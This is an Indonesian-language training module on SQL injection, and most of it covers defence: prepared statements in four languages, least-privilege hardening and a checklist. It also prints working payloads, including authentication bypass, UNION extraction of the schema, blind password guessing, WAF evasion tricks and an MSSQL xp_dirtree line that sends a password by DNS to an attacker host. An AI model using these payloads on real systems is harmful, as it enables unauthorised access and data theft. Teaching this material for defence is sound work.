# MODUL 4: OWASP TOP 10: SQL INJECTION (SQLi) EKSPLOITASI & MITIGASI MENDALAM

## 1. Apa Itu SQL Injection?
SQL Injection (SQLi) adalah salah satu kerentanan keamanan perangkat lunak tertua, paling mematikan, dan paling sering dieksploitasi dalam sejarah komputasi web. Terdaftar secara resmi dalam katalog kerentanan **MITRE CWE-89** dan menduduki peringkat teratas pada kategori **OWASP Top 10 A03:2021 - Injection**.

SQLi terjadi ketika aplikasi web menggabungkan input pengguna yang tidak terpercaya langsung ke dalam klausa instruksi SQL dinamis tanpa proses validasi, sanitasi, atau pemisahan parameter yang tepat. Akibatnya, mesin basis data (*Database Engine*) salah mengartikan input data pengguna sebagai **perintah kode eksekutif baru**.

```text
         [ INPUT PENGGUNA ] ──────>  "admin' OR '1'='1"
                 │
                 ▼
  [ APLIKASI WEB VULNERABLE ] ───>  SELECT * FROM users WHERE user = 'admin' OR '1'='1'
                 │
                 ▼
    [ DATABASE ENGINE ]      ───>  Parser mengevaluasi logika: TRUE selalu benar!
                                   Akses Administrator bocor seketika!
```

---

## 2. Anatomi Internal: Mengapa String Concatenation Sangat Fatal?
Di balik layar, mesin basis data (MySQL, PostgreSQL, Oracle, SQLite) memproses query SQL melalui tahapan:
1. **Lexical Analysis:** Mengelompokkan karakter teks menjadi token (kata kunci `SELECT`, `FROM`, tanda kutip `'`, operator logika `AND/OR`).
2. **Syntax Analysis (AST Parsing):** Membangun pohon sintaksis abstrak (*Abstract Syntax Tree*).
3. **Query Optimization & Execution:** Menjalankan instruksi yang terbentuk di disk.

### Kode Rentan (Vulnerable String Concatenation):
```javascript
// KODE INI SANGAT BERBAHAYA! JANGAN PERNAH DIGUNAKAN!
const query = "SELECT id, username, role FROM users WHERE username = '" + req.body.username + "' AND password = '" + req.body.password + "'";
db.exec(query);
```

Jika pengguna memasukkan username: `admin' --`
Struktur pohon sintaksis SQL berubah total:
```sql
SELECT id, username, role FROM users WHERE username = 'admin' -- ' AND password = 'xxx'
```
Token `--` (atau `#` pada MySQL) menginstruksikan parser SQL bahwa **seluruh karakter setelahnya adalah komentar teks murni**. Logika pengecekan password dibuang sepenuhnya! Database mengembalikan baris data akun `admin`, dan penyerang berhasil membobol akun tanpa password!

---

## 3. Klasifikasi Lengkap Teknik Serangan SQL Injection
Berdasarkan saluran komunikasi dan respon aplikasi, serangan SQLi terbagi menjadi 3 kategori besar:

### A. In-Band SQLi (Classic)
Penyerang menggunakan saluran komunikasi yang sama untuk menyuntikkan payload dan mengekstrak hasil curian data pada layar respons web:

1. **Error-Based SQLi:**
   Penyerang sengaja memicu eror internal database (misal dengan memasukkan karakter ilegal atau fungsi matematis seperti pembagian nol atau `extractvalue()` di MySQL). Mesin database yang salah konfigurasi akan mencetak detail error lengkap beserta data rahasia ke layar peramban.
2. **UNION-Based SQLi:**
   Penyerang menggabungkan hasil query asli aplikasi dengan query kedua milik penyerang menggunakan operator `UNION SELECT`:
   ```sql
   ' UNION SELECT 1, table_name, column_name FROM information_schema.columns --
   ```
   - **Syarat Mutlak Serangan UNION:**
     1. Jumlah kolom yang diminta pada query kedua harus persis sama dengan jumlah kolom query pertama.
     2. Tipe data kolom (string, integer, date) harus saling kompatibel.

---

### B. Inferential / Blind SQLi
Aplikasi web tidak menampilkan error database dan tidak mencetak data hasil query pada halaman HTML. Namun, kerentanan tetap dapat dieksploitasi melalui teknik inferensi:

1. **Boolean-Based Blind SQLi:**
   Penyerang mengajukan pertanyaan biner (Benar atau Salah) kepada database dan mengamati perbedaan respons HTTP (misal: halaman menampilkan *"Produk Ditemukan"* vs *"Produk Tidak Ada"*):
   ```sql
   -- Menebak huruf pertama password admin: Apakah karakter pertama bernilai 'a'?
   ' AND SUBSTRING((SELECT password FROM users WHERE id=1), 1, 1) = 'a' --
   ```
2. **Time-Based Blind SQLi:**
   Jika aplikasi tidak menunjukkan perbedaan visual sama sekali, penyerang menyuntikkan fungsi penunda waktu komputasi (*time delay*) seperti `SLEEP(5)` di MySQL, `pg_sleep(5)` di PostgreSQL, atau `WAITFOR DELAY '0:0:5'` di MSSQL.
   Jika server merespons 5 detik lebih lambat, penyerang memastikan bahwa tebakannya benar!

---

### C. Out-of-Band (OOB) SQLi
Digunakan ketika penyerang tidak dapat melihat hasil di layar dan server web memiliki pemblokiran respon waktu, namun server basis data diizinkan melakukan koneksi jaringan keluar (*Outbound DNS/SMB request*). 

Penyerang memaksa database melakukan DNS lookup ke server penyerang dengan membawa data rahasia sebagai subdomain:
```sql
-- Contoh MSSQL Out-of-band via DNS Resolution:
'; EXEC master..xp_dirtree '\\' + (SELECT TOP 1 password FROM users) + '.attacker-controlled-server.com\foobar' --
```

---

## 4. Teknik Evasion Terhadap Web Application Firewall (WAF)
WAF tingkat rendah yang hanya mengandalkan pencocokan regex kata kunci sering kali dapat dibypass oleh penetration tester menggunakan teknik:
- **Inline Comment Obfuscation:** Mengganti spasi dengan komentar SQL: `admin'/**/OR/**/1=1/**/--`
- **Case Alternation:** `uNiOn/**/sElEcT`
- **URL Double Encoding:** Mengubah tanda kutip tunggal (`'`) menjadi `%27`, kemudian di-encode ulang menjadi `%2527`.
- **String Konkatenasi Dinamis:** Menggunakan fungsi `CHAR()` atau representasi Hexadesimal (`0x61646d696e` untuk teks `admin`).

---

## 5. Solusi Definitif: Parameterized Queries & Prepared Statements
Satu-satunya solusi absolut yang terbukti 100% kebal terhadap seluruh varian SQL Injection adalah **Prepared Statements (Parameterized Queries)**.

```text
FASE 1: PREPARE (Kompilasi Query di Database)
Aplikasi kirim kerangka SQL: "SELECT * FROM users WHERE email = ? AND password = ?"
Database Parser menyusun AST: Struktur query dibekukan secara permanen!

FASE 2: EXECUTE (Pengiriman Data)
Aplikasi kirim data input: ? = "admin' OR '1'='1 --"
Database Engine: "Nilai ini adalah string literal murni, BUKAN kode!"
Hasil: Serangan Gagal Total!
```

### Komparasi Implementasi Aman di Berbagai Bahasa Pemrograman:

```javascript
// 1. NODE.JS (Better-SQLite3) - AMAN
const stmt = db.prepare('SELECT id, role FROM users WHERE username = ? AND password_hash = ?');
const user = stmt.get(req.body.username, hashedPassword);

// 2. PYTHON (SQLite3 / Psycopg2) - AMAN
cursor.execute("SELECT id, role FROM users WHERE username = %s AND password_hash = %s", (username, hashed_pass))

// 3. PHP (PDO) - AMAN
$stmt = $pdo->prepare('SELECT id, role FROM users WHERE username = :user AND password_hash = :pass');
$stmt->execute(['user' => $username, 'pass' => $hashed_pass]);

// 4. JAVA (PreparedStatement) - AMAN
PreparedStatement ps = conn.prepareStatement("SELECT id, role FROM users WHERE username = ? AND password_hash = ?");
ps.setString(1, username);
ps.setString(2, hashed_pass);
ResultSet rs = ps.executeQuery();
```

---

## 6. Studi Kasus Nyata: Skandal Pembobolan Data Equifax & Heartland
- **Equifax Data Breach (2017):** Kelalaian menambal kerentanan injeksi dan kegagalan segmentasi database menyebabkan bocornya data identitas finansial pribadi milik lebih dari **147 juta warga Amerika Serikat**, yang berujung pada denda regulator sebesar **$575 Juta USD**.
- **Heartland Payment Systems:** Serangan SQLi terhadap aplikasi web pembayaran memotong akses langsung ke database pemrosesan kartu kredit, menyebabkan pencurian lebih dari **130 juta nomor kartu debit/kredit** dan kerugian institusi lebih dari $200 Juta USD.

---

## 7. Checklist Hardening Basis Data Terintegrasi
1. Wajib gunakan **Prepared Statements** untuk 100% query dinamis.
2. Terapkan prinsip **Least Privilege Database User:** Akun database yang digunakan aplikasi web tidak boleh berstatus `root` atau `sa`, dan tidak boleh memiliki hak `DROP TABLE`, `ALTER`, atau akses ke prosedur sistem (`xp_cmdshell`, `LOAD_FILE`).
3. Nonaktifkan pelaporan error database yang verbose di lingkungan produksi (*Turn off display_errors*).
4. Tempatkan database pada subnet pribadi (*Private Subnet / Isolated VLAN*) tanpa akses publik internet langsung.

---

## 8. Referensi & Standar Kepatuhan Resmi
- **OWASP Top 10:2021:** *Category A03:2021 - Injection*.
- **MITRE CWE-89:** *Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')*.
- **NIST SP 800-95:** *Guide to Secure Web Services*.
- **OWASP Cheat Sheet Series:** *SQL Injection Prevention Cheat Sheet*.


---

## 9. Operational Security Playbook: Secure Query Engineering
Panduan bagi developer dan software architect untuk menjamin aplikasi 100% bebas dari celah injeksi:

<div class="cyber-checklist">
  <div class="checklist-title">
    <i class="fa-solid fa-database"></i> SOP Pencegahan SQL Injection untuk Tim Pengembang Aplikasi
  </div>
  <div class="checklist-row">
    <i class="fa-solid fa-square-check checklist-check"></i>
    <div><strong>Penegakan 100% Prepared Statements:</strong> Mengharamkan seluruh bentuk penggabungan string (concatenation) pada pembentukan query SQL dinamis.</div>
  </div>
  <div class="checklist-row">
    <i class="fa-solid fa-square-check checklist-check"></i>
    <div><strong>Konfigurasi Least Privilege User DB:</strong> User database aplikasi hanya diberi hak `SELECT`, `INSERT`, `UPDATE`, `DELETE` pada tabel yang relevan (tanpa hak DDL).</div>
  </div>
  <div class="checklist-row">
    <i class="fa-solid fa-square-check checklist-check"></i>
    <div><strong>Mematikan Pesan Error Verbose:</strong> Nonaktifkan pencetakan pesan error database ke layar pengguna di lingkungan server produksi.</div>
  </div>
  <div class="checklist-row">
    <i class="fa-solid fa-square-check checklist-check"></i>
    <div><strong>Isolasi Jaringan Database:</strong> Tempatkan server database pada private subnet terisolasi tanpa IP publik internet.</div>
  </div>
  <div class="checklist-row">
    <i class="fa-solid fa-square-check checklist-check"></i>
    <div><strong>Automasi Uji Statis (SAST):</strong> Integrasikan tool analisis kode otomatis (seperti SonarQube / Semgrep) ke dalam pipeline CI/CD.</div>
  </div>
</div>

---

## 10. Kamus Istilah & Glosarium Akronim Kunci

| Akronim / Istilah | Kepanjangan Resmi | Definisi Operasional |
| :--- | :--- | :--- |
| <span class="glossary-term">SQLi</span> | *Structured Query Language Injection* | Kerentanan manipulasi perintah database melalui input aplikasi yang tidak aman. |
| <span class="glossary-term">AST</span> | *Abstract Syntax Tree* | Struktur pohon sintaksis logika query yang dibentuk oleh parser database engine. |
| <span class="glossary-term">OOB</span> | *Out-of-Band SQL Injection* | Teknik ekstraksi data melalui kanal komunikasi alternatif (seperti query DNS eksternal). |
| <span class="glossary-term">WAF</span> | *Web Application Firewall* | Sistem penyaring muatan payload HTTP/HTTPS Layer 7 untuk memblokir serangan aplikasi web. |
| <span class="glossary-term">ORM</span> | *Object-Relational Mapping* | Pustaka abstraksi database (seperti Prisma, Hibernate) yang secara default menggunakan parameter query. |
